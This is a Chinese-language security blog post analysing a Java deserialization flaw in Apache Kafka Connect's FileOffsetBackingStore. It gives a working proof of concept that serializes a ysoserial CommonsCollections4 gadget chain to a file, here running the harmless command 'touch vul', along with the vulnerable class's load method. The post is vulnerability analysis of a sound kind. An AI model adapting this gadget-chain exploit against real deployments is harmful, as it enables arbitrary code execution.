---
title: 【漏洞分析】Apache kafka反序列化漏洞
date: 2017-07-20 17:24:07
categories: Web安全
tags:
    - JAVA
    - 反序列化
---

## 漏洞简介

Apache kafka组件反序列化漏洞是FileOffsetBackingStore类在反序列化本地文件时引发的，实际场景中用到的并不多，简单复现下做个记录。

<!-- more -->
## 漏洞复现

测试源码如下:

```
import org.apache.commons.io.FileUtils;
import org.apache.kafka.connect.runtime.standalone.StandaloneConfig;
import org.apache.kafka.connect.storage.FileOffsetBackingStore;
import ysoserial.payloads.Jdk7u21;
import ysoserial.payloads.CommonsCollections4;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.util.Map;

/**
 * Created by js on 2017/7/20.
 */
public class KafkaPoc {
    public static void testKafkaDeser() throws Exception {
        StandaloneConfig config;
        String projectDir = System.getProperty("user.dir");
        CommonsCollections4 cc4 = new CommonsCollections4();
        Object o = cc4.getObject("touch vul");

//        Jdk7u21 jdk7u21 = new Jdk7u21();
//        Object o = jdk7u21.getObject("touch vul");

        byte[] ser = serialize(o);

        File tempFile = new File(projectDir + "/payload.ser");
        FileUtils.writeByteArrayToFile(tempFile, ser);

        Map<String, String> props = new HashMap<String, String>();
        props.put(StandaloneConfig.OFFSET_STORAGE_FILE_FILENAME_CONFIG, tempFile.getAbsolutePath());
        props.put(StandaloneConfig.KEY_CONVERTER_CLASS_CONFIG, "org.apache.kafka.connect.json.JsonConverter");
        props.put(StandaloneConfig.VALUE_CONVERTER_CLASS_CONFIG, "org.apache.kafka.connect.json.JsonConverter");
        props.put(StandaloneConfig.INTERNAL_KEY_CONVERTER_CLASS_CONFIG, "org.apache.kafka.connect.json.JsonConverter");
        props.put(StandaloneConfig.INTERNAL_VALUE_CONVERTER_CLASS_CONFIG, "org.apache.kafka.connect.json.JsonConverter");
        config = new StandaloneConfig(props);

        FileOffsetBackingStore restore = new FileOffsetBackingStore();
        restore.configure(config);
        restore.start();
    }

    private static byte[] serialize(Object object) throws IOException {
        ByteArrayOutputStream bout = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(bout);
        out.writeObject(object);
        out.flush();
        return bout.toByteArray();
    }

    public static void main(String[] args) throws Exception{
        KafkaPoc.testKafkaDeser();
    }
}

```

pom.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.poc</groupId>
    <artifactId>kafkatest</artifactId>
    <version>1.0-SNAPSHOT</version>

    <dependencies>
    <dependency>
        <groupId>org.apache.kafka</groupId>
        <artifactId>connect-runtime</artifactId>
        <version>0.11.0.0</version>
    </dependency>
    <!-- https://mvnrepository.com/artifact/org.apache.kafka/connect-json -->
    <dependency>
        <groupId>org.apache.kafka</groupId>
        <artifactId>connect-json</artifactId>
        <version>0.11.0.0</version>
        <!--<scope>test</scope>-->
    </dependency>
    </dependencies>

</project>
```

执行程序会在本地新建一个名为"vul"的文件，证明漏洞存在。

## 漏洞分析

上面验证代码逻辑简单，写的比较清晰，不具体分析了。可以看看FileOffsetBackingStore类的实现，`configure`方法获取`"offset.storage.file.filename"`指定的值实例化一个文件对象，`start`方法调用会调用`load`方法，而`load`方法中反序列化之前实例化的文件对象，触发反序列漏洞。

```
public class FileOffsetBackingStore extends MemoryOffsetBackingStore {
    private static final Logger log = LoggerFactory.getLogger(FileOffsetBackingStore.class);
    private File file;

    public FileOffsetBackingStore() {
    }

    public void configure(WorkerConfig config) {
        super.configure(config);
        this.file = new File(config.getString("offset.storage.file.filename"));
    }

    public synchronized void start() {
        super.start();
        log.info("Starting FileOffsetBackingStore with file {}", this.file);
        this.load();
    }

    public synchronized void stop() {
        super.stop();
        log.info("Stopped FileOffsetBackingStore");
    }

    private void load() {
        try {
            ObjectInputStream is = new ObjectInputStream(new FileInputStream(this.file));
            Object obj = is.readObject();
            if(!(obj instanceof HashMap)) {
                throw new ConnectException("Expected HashMap but found " + obj.getClass());
            }

            Map<byte[], byte[]> raw = (Map)obj;
            this.data = new HashMap();
            Iterator i$ = raw.entrySet().iterator();

            while(i$.hasNext()) {
                Entry<byte[], byte[]> mapEntry = (Entry)i$.next();
                ByteBuffer key = mapEntry.getKey() != null?ByteBuffer.wrap((byte[])mapEntry.getKey()):null;
                ByteBuffer value = mapEntry.getValue() != null?ByteBuffer.wrap((byte[])mapEntry.getValue()):null;
                this.data.put(key, value);
            }

            is.close();
        } catch (EOFException | FileNotFoundException var8) {
            ;
        } catch (ClassNotFoundException | IOException var9) {
            throw new ConnectException(var9);
        }

    }
```

## Ref

* [http://seclists.org/oss-sec/2017/q3/184](http://seclists.org/oss-sec/2017/q3/184)
* [http://www.polaris-lab.com/index.php/archives/345/](http://www.polaris-lab.com/index.php/archives/345/)